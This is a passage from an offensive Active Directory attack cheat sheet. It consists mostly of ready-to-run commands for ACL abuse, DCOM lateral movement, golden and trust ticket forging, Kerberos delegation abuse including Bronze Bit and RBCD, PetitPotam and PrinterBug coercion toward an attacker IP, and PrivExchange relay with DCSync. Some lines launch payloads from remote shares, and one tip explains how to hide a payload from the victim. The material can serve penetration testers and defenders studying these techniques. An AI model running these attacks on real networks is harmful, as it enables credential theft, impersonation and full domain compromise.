pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \u0026quot;\\\\10.0.0.5\\totallyLegitScript.ps1\nGenericWrite and Remote Connection Manager # Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.\nThis tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/\n:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (\u0026gt;2016), it requires a registry change to re-enable.\n$UserObject = ([ADSI](\u0026#34;LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\u0026#34;)) $UserObject.TerminalServicesInitialProgram = \u0026#34;\\\\1.2.3.4\\share\\file.exe\u0026#34; $UserObject.TerminalServicesWorkDirectory = \u0026#34;C:\\\u0026#34; $UserObject.SetInfo() NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.\nWriteDACL # To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : ./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'\nWriteDACL on Domain:\nOn Windows: # Give DCSync right to the principal identity Import-Module .\\PowerView.ps1 $SecPassword = ConvertTo-SecureString \u0026#39;user1pwd\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;DOMAIN.LOCAL\\user1\u0026#39;, $SecPassword) Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#39;DC=domain,DC=local\u0026#39; -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local * On Linux:\nGive DCSync right to the principal identity oodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 Remove right after DCSync oodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False WriteDACL on Group\nAdd-DomainObjectAcl -TargetIdentity \u0026#34;INTERESTING_GROUP\u0026#34; -Rights WriteMembers -PrincipalIdentity User1 net group \u0026#34;INTERESTING_GROUP\u0026#34; User1 /add /domain Or\nbloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp # Remove right bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False WriteOwner # An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).\nSet-DomainObjectOwner -Identity \u0026#39;target_object\u0026#39; -OwnerIdentity \u0026#39;controlled_principal\u0026#39; Or\nbloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.\nReadLAPSPassword # An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section.\nGet-ADComputer -filter {ms-mcs-admpwdexpirationtime -like \u0026#39;*\u0026#39;} -prop \u0026#39;ms-mcs-admpwd\u0026#39;,\u0026#39;ms-mcs-admpwdexpirationtime\u0026#39; Or for a given computer\nbloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime ReadGMSAPassword # An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.\n# Save the blob to a variable $gmsa = Get-ADServiceAccount -Identity \u0026#39;SQL_HQ_Primary\u0026#39; -Properties \u0026#39;msDS-ManagedPassword\u0026#39; $mp = $gmsa.\u0026#39;msDS-ManagedPassword\u0026#39; # Decode the data structure using the DSInternals module ConvertFrom-ADManagedPasswordBlob $mp Or\npython bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword ForceChangePassword # An attacker can change the password of the user this ACE applies to:\nOn Windows, this can be achieved with Set-DomainUserPassword (PowerView module): $NewPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force Set-DomainUserPassword -Identity \u0026#39;TargetUser\u0026#39; -AccountPassword $NewPassword On Linux: # Using rpcclient from the Samba software suite rpcclient -U \u0026#39;attacker_user%my_password\u0026#39; -W DOMAIN -c \u0026#34;setuserinfo2 target_user 23 target_newpwd\u0026#34; # Using bloodyAD with pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd DCOM Exploitation # DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.\nImpacket DCOMExec.py dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...] dcomexec.py -share C$ -object MMC20 \u0026#39;\u0026lt;DOMAIN\u0026gt;/\u0026lt;USERNAME\u0026gt;:\u0026lt;PASSWORD\u0026gt;@\u0026lt;MACHINE_CIBLE\u0026gt;\u0026#39; dcomexec.py -share C$ -object MMC20 \u0026#39;\u0026lt;DOMAIN\u0026gt;/\u0026lt;USERNAME\u0026gt;:\u0026lt;PASSWORD\u0026gt;@\u0026lt;MACHINE_CIBLE\u0026gt;\u0026#39; \u0026#39;ipconfig\u0026#39; python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST \u0026#39;notepad.exe\u0026#39; # -object MMC20 specifies that we wish to instantiate the MMC20.Application object. # -silentcommand executes the command without attempting to retrieve the output. CheeseTools - https://github.com/klezVirus/CheeseTools # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/ -t, --target=VALUE Target Machine -b, --binary=VALUE Binary: powershell.exe -a, --args=VALUE Arguments: -enc \u0026lt;blah\u0026gt; -m, --method=VALUE Methods: MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro -r, --reg, --registry Enable registry manipulation -h, -?, --help Show Help Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro. Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1 Import-Module .\\Invoke-DCOM.ps1 Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method MMC20.Application -Command \u0026#34;calc.exe\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ExcelDDE -Command \u0026#34;calc.exe\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ServiceStart \u0026#34;MyService\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ShellBrowserWindow -Command \u0026#34;calc.exe\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ShellWindows -Command \u0026#34;calc.exe\u0026#34; DCOM via MMC Application Class # This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \u0026ldquo;ExecuteShellCommand\u0026rdquo; under Document.ActiveView.\nPS C:\\\u0026gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;MMC20.Application\u0026#34;,\u0026#34;10.10.10.1\u0026#34;)) PS C:\\\u0026gt; $com.Document.ActiveView.ExecuteShellCommand(\u0026#34;C:\\Windows\\System32\\calc.exe\u0026#34;,$null,$null,7) PS C:\\\u0026gt; $com.Document.ActiveView.ExecuteShellCommand(\u0026#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34;,$null,\u0026#34;-enc DFDFSFSFSFSFSFSFSDFSFSF \u0026lt; Empire encoded string \u0026gt; \u0026#34;,\u0026#34;7\u0026#34;) # Weaponized example with MSBuild PS C:\\\u0026gt; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;MMC20.Application\u0026#34;,\u0026#34;10.10.10.1\u0026#34;)).Document.ActiveView.ExecuteShellCommand(\u0026#34;c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\u0026#34;,$null,\u0026#34;\\\\10.10.10.2\\webdav\\build.xml\u0026#34;,\u0026#34;7\u0026#34;) Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1\nDCOM via Office # Excel.Application DDEInitiate RegisterXLL Outlook.Application CreateObject-\u0026gt;Shell.Application-\u0026gt;ShellExecute CreateObject-\u0026gt;ScriptControl (office-32bit only) Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window) Addons ExecuteLine Word.Application RunAutoMacro # Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9 Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a # Using Excel DDE PS C:\\\u0026gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;Excel.Application\u0026#34;, \u0026#34;$ComputerName\u0026#34;)) PS C:\\\u0026gt; $excel.DisplayAlerts = $false PS C:\\\u0026gt; $excel.DDEInitiate(\u0026#34;cmd\u0026#34;, \u0026#34;/c calc.exe\u0026#34;) # Using Excel RegisterXLL # Can\u0026#39;t be used reliably with a remote target Require: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1 PS\u0026gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;Excel.Application\u0026#34;, \u0026#34;$ComputerName\u0026#34;)) PS\u0026gt; $excel.RegisterXLL(\u0026#34;EvilXLL.dll\u0026#34;) # Using Visio $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;Visio.InvisibleApp\u0026#34;, \u0026#34;$ComputerName\u0026#34;)) $visio.Addons.Add(\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;).Run(\u0026#34;/c calc\u0026#34;) DCOM via ShellExecute # $com = [Type]::GetTypeFromCLSID(\u0026#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39\u0026#39;,\u0026#34;10.10.10.1\u0026#34;) $obj = [System.Activator]::CreateInstance($com) $item = $obj.Item() $item.Document.Application.ShellExecute(\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c calc.exe\u0026#34;,\u0026#34;C:\\windows\\system32\u0026#34;,$null,0) DCOM via ShellBrowserWindow # :warning: Windows 10 only, the object doesn\u0026rsquo;t exists in Windows 7\n$com = [Type]::GetTypeFromCLSID(\u0026#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880\u0026#39;,\u0026#34;10.10.10.1\u0026#34;) $obj = [System.Activator]::CreateInstance($com) $obj.Application.ShellExecute(\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c calc.exe\u0026#34;,\u0026#34;C:\\windows\\system32\u0026#34;,$null,0) Trust relationship between domains # One-way Domain B trusts A Users in Domain A can access resources in Domain B Users in Domain B cannot access resources in Domain A Two-way Domain A trusts Domain B Domain B trusts Domain A Authentication requests can be passed between the two domains in both directions Enumerate trusts between domains # nltest /trusted_domains or\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() SourceName TargetName TrustType TrustDirection ---------- ---------- --------- -------------- domainA.local domainB.local TreeRoot Bidirectional Exploit trusts between domains # :warning: Require a Domain-Admin level access to the current domain.\nSource Target Technique to use Trust relationship Root Child Golden Ticket + Enterprise Admin group (Mimikatz /groups) Inter Realm (2-way) Child Child SID History exploitation (Mimikatz /sids) Inter Realm Parent-Child (2-way) Child Root SID History exploitation (Mimikatz /sids) Inter Realm Tree-Root (2-way) Forest A Forest B PrinterBug + Unconstrained delegation ? Inter Realm Forest or External (2-way) Child Domain to Forest Compromise - SID Hijacking # Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root.\nRequirements:\nKRBTGT Hash Find the SID of the domain $ Convert-NameToSid target.domain.com\\krbtgt S-1-5-21-2941561648-383941485-1389968811-502 # with Impacket lookupsid.py domain/user:password@10.10.10.10 Replace 502 with 519 to represent Enterprise Admins Create golden ticket and attack parent domain. kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt Forest to Forest Compromise - Trust Ticket # Require: SID filtering disabled From the DC, dump the hash of the currentdomain\\targetdomain$ trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain\u0026rsquo;s enterprise admins group to our SID history.\nDumping trust passwords (trust keys) # Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts.\nlsadump::trust /patch or find the TRUST_NAME$ machine account hash Create a forged trust ticket (inter-realm TGT) using Mimikatz # mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi Use the Trust Ticket file to get a ST for the targeted service # .\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local .\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt Inject the ST file and access the targeted service with the spoofed rights.\nkirbikator lsa .\\ticket.kirbi ls \\\\machine.domain.local\\c$ Privileged Access Management (PAM) Trust # Require: Windows Server 2016 or earlier\nIf we compromise the bastion we get Domain Admins privileges on the other domain\nDefault configuration for PAM Trust # execute on our forest netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes netdom trust lab.local /domain:bastion.local /Quarantine:No # execute on our bastion netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes Enumerate # Using ADModule Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} # Enumerate shadow security principals Get-ADObject -SearchBase (\u0026#34;CN=Shadow Principal Configuration,CN=Services,\u0026#34; + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl Compromise Using SID History Using the previously found Shadow Security Principal Kerberos Unconstrained Delegation # The user sends a ST to access the service, along with their TGT, and then the service can use the user\u0026rsquo;s TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\nWhen a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user\u0026rsquo;s TGT ticket gets saved to that computer\u0026rsquo;s memory.\n:warning: Unconstrained delegation used to be the only option available in Windows 2000\nSpoolService Abuse with Unconstrained Delegation # The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.\nRequirements:\nObject with Property Trust this computer for delegation to any service (Kerberos only) Must have ADS_UF_TRUSTED_FOR_DELEGATION Must not have ADS_UF_NOT_DELEGATED flag User must not be in the Protected Users group User must not have the flag Account is sensitive and cannot be delegated Find delegation # :warning: : Domain controllers usually have unconstrained delegation enabled. Check the TrustedForDelegation property.\nADModule\n# From https://github.com/samratashok/ADModule PS\u0026gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True} ldapdomaindump\n$\u0026gt; ldapdomaindump -u \u0026#34;DOMAIN\\\\Account\u0026#34; -p \u0026#34;Password123*\u0026#34; 10.10.10.10 grep TRUSTED_FOR_DELEGATION domain_computers.grep CrackMapExec module\ncme ldap 10.10.10.10 -u username -p password --trusted-for-delegation SpoolService status # Check if the spool service is running on the remote host\nls \\\\dc01\\pipe\\spoolss python rpcdump.py DOMAIN/user:password@10.10.10.10 Monitor with Rubeus # Monitor incoming connections from Rubeus.\nRubeus.exe monitor /interval:1 Force a connect back from the DC # Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.\nSpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \u0026ldquo;feature\u0026rdquo; in the MS-RPRN RPC interface.\n# From https://github.com/leechristensen/SpoolSample .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME .\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB # DC01.HACKER.LAB is the domain controller we want to compromise # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control. # From https://github.com/dirkjanm/krbrelayx printerbug.py \u0026#39;domain/username:password\u0026#39;@\u0026lt;VICTIM-DC-NAME\u0026gt; \u0026lt;UNCONSTRAINED-SERVER-DC-NAME\u0026gt; # From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689 python dementor.py -d domain -u username -p password \u0026lt;UNCONSTRAINED-SERVER-DC-NAME\u0026gt; \u0026lt;VICTIM-DC-NAME\u0026gt; If the attack worked you should get a TGT of the domain controller.\nLoad the ticket # Extract the base64 TGT from Rubeus output and load it to our current session.\n.\\Rubeus.exe asktgs /ticket:\u0026lt;ticket base64\u0026gt; /ptt Alternatively you could also grab the ticket using Mimikatz : mimikatz # sekurlsa::tickets\nThen you can use DCsync or another attack : mimikatz # lsadump::dcsync /user:HACKER\\krbtgt\nMitigation # Ensure sensitive accounts cannot be delegated Disable the Print Spooler Service MS-EFSRPC Abuse with Unconstrained Delegation # Using PetitPotam, another tool to coerce a callback from the targeted machine, instead of SpoolSample.\n# Coerce the callback git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d \u0026#39;\u0026#39; -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; $ATTACKER_IP $TARGET_IP # Extract the ticket .\\Rubeus.exe asktgs /ticket:\u0026lt;ticket base64\u0026gt; /ptt Kerberos Constrained Delegation # Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,\nPassing the -impersonate flag and specifying the user we wish to impersonate (any valid username).\n# Discover $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname # Find the service $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo Exploit the Constrained Delegation # Impacket $ getST.py -spn HOST/SQL01.DOMAIN \u0026#39;DOMAIN/user:password\u0026#39; -impersonate Administrator -dc-ip 10.10.10.10 Rubeus $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:... $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\u0026#34;cifs/dc.domain.com\u0026#34; /altservice:cifs,http,host,rpcss,wsman,ldap /ptt $ dir \\\\dc.domain.com\\c$ Impersonate a domain user on a resource # Require:\nSYSTEM level privileges on a machine configured with constrained delegation PS\u0026gt; [Reflection.Assembly]::LoadWithPartialName(\u0026#39;System.IdentityModel\u0026#39;) | out-null PS\u0026gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @(\u0026#39;administrator\u0026#39;) PS\u0026gt; $idToImpersonate.Impersonate() PS\u0026gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name PS\u0026gt; ls \\\\dc01.offense.local\\c$ Kerberos Resource Based Constrained Delegation # Resource-based Constrained Delegation was introduced in Windows Server 2012.\nThe user sends a Service Ticket (ST) to access the service (\u0026ldquo;Service A\u0026rdquo;), and if the service is allowed to delegate to another pre-defined service (\u0026ldquo;Service B\u0026rdquo;), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B. https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\nImport Powermad and Powerview\nPowerShell.exe -ExecutionPolicy Bypass Import-Module .\\powermad.ps1 Import-Module .\\powerview.ps1 Get user SID\n$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID} $ACE ConvertFrom-SID $ACE.SecurityIdentifier Abuse MachineAccountQuota to create a computer account and set an SPN for it\nNew-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString \u0026#39;Weakest123*\u0026#39; -AsPlainText -Force) Rewrite DC\u0026rsquo;s AllowedToActOnBehalfOfOtherIdentity properties\n$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties \u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39; | select -expand msds-allowedtoactonbehalfofotheridentity $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl # alternative $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\u0026#34;; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} # alternative StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND Use Rubeus to get hash from password\nRubeus.exe hash /password:\u0026#39;Weakest123*\u0026#39; /user:swktest$ /domain:factory.lan [*] Input password : Weakest123* [*] Input username : swktest$ [*] Input domain : factory.lan [*] Salt : FACTORY.LANswktest [*] rc4_hmac : F8E064CA98539B735600714A1F1907DD [*] aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498 [*] aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 [*] des_cbc_md5 : BA297CFD07E62A5E Impersonate domain admin using our newly created machine account\n.\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap .\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap [*] Impersonating user \u0026#39;Administrator\u0026#39; to target SPN \u0026#39;cifs/dc01-ww2.factory.lan\u0026#39; [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5) [*] Building S4U2proxy request for service: \u0026#39;cifs/dc01-ww2.factory.lan\u0026#39; [*] Sending S4U2proxy request [+] S4U2proxy success! [*] base64(ticket.kirbi) for SPN \u0026#39;cifs/dc01-ww2.factory.lan\u0026#39;: doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE LmZhY3RvcnkubGFu [*] Action: Import Ticket [+] Ticket successfully imported! Kerberos Bronze Bit Attack - CVE-2020-17049 # An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated.\nPatch is out on November 10, 2020, DC are most likely vulnerable until February 2021.\n:warning: Patched Error Message : [-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)\nRequirements:\nService account\u0026rsquo;s password hash Service account\u0026rsquo;s with Constrained Delegation or Resource Based Constrained Delegation Impacket PR #1013 Attack #1 - Bypass the Trust this user for delegation to specified services only – Use Kerberos only protection and impersonate a user who is protected from delegation.\n# forwardable flag is only protected by the ticket encryption which uses the service account\u0026#39;s password $ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes \u0026lt;LM:NTLM hash\u0026gt; -aesKey \u0026lt;AES hash\u0026gt; test.local/Service1 -force-forwardable -dc-ip \u0026lt;Domain controller\u0026gt; # -\u0026gt; Forwardable $ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable # Load the ticket .\\mimikatz\\mimikatz.exe \u0026#34;kerberos::ptc User2.ccache\u0026#34; exit # Access \u0026#34;c$\u0026#34; ls \\\\service2.test.local\\c$ Attack #2 - Write Permissions to one or more objects in the AD\n# Create a new machine account Import-Module .\\Powermad\\powermad.ps1 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString \u0026#39;AttackerServicePassword\u0026#39; -AsPlainText -Force) .\\mimikatz\\mimikatz.exe \u0026#34;kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\u0026#34; exit # Set PrincipalsAllowedToDelegateToAccount Install-WindowsFeature RSAT-AD-PowerShell Import-Module ActiveDirectory Get-ADComputer AttackerService Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount # Execute the attack python .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ # Load the ticket .\\mimikatz\\mimikatz.exe \u0026#34;kerberos::ptc User2.ccache\u0026#34; exit | Out-Null PrivExchange attack # Exchange your privileges for Domain Admin privs by abusing Exchange. :warning: You need a shell on a user account with a mailbox.\nExchange server hostname or IP address\npth-net rpc group members \u0026#34;Exchange Servers\u0026#34; -I dc01.domain.local -U domain/username Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).\nntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server\u0026rsquo;s to send back its NTLMv2 hash to a controlled machine.\n# https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange # https://github.com/G0ldenGunSec/PowerPriv powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016 Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user\u0026rsquo;s NTLM hash\npython secretsdump.py xxxxxxxxxx -just-dc python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm Clean your mess and restore a previous state of the user\u0026rsquo;s ACL\npython aclpwn.py --restore ../aclpwn-20190319-125741.restore Alternatively you can use the Metasploit module\nuse auxiliary/scanner/http/exchange_web_server_pushsubscription\nAlternatively you 